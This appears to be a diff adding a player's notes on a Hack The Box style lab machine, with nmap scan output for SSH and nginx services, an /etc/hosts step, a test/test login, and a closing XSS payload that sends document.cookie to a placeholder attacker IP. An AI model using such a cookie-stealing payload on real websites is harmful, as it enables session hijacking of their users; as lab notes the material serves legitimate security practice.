@@ -1,0 +1,42 @@
+nmap:
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBATYMh9+BdqMhKwmA92batW+nssvLnig8s6LRKfe4TUd4IfmWsL1NeMU+03etGZssHGdzVGuKWinJEZP8nxPCSg=
+|   256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDBeEEQbMbbA8xyqfl6Z4O04eLAIn5/kX1+dhQn96SJp
+80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://itrc.ssg.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+2222/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPYMhQGEpSM4Alh2GZifayHk69JaFxvinZsgYG+EmcDoShW6Q24vrCoG7QFlArzIHmzoNyPewZ05MjQ7dKttWbk=
+|   256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINF7vRlT0/vggYRb7yoEPXwV4ZAZEu0Qq/mfj1sKKjnK
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 20:16
+Completed NSE at 20:16, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 20:16
+Completed NSE at 20:16, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 20:16
+Completed NSE at 20:16, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.92 seconds
+
+added the url to /etc/hosts 
+
+manage to enter the login webpage by:
+test
+test
+
+by visiting the page i saw that some may use a XSS payload:
+<script>document.location='http:/<IP>>/?='+document.cookie;</script>
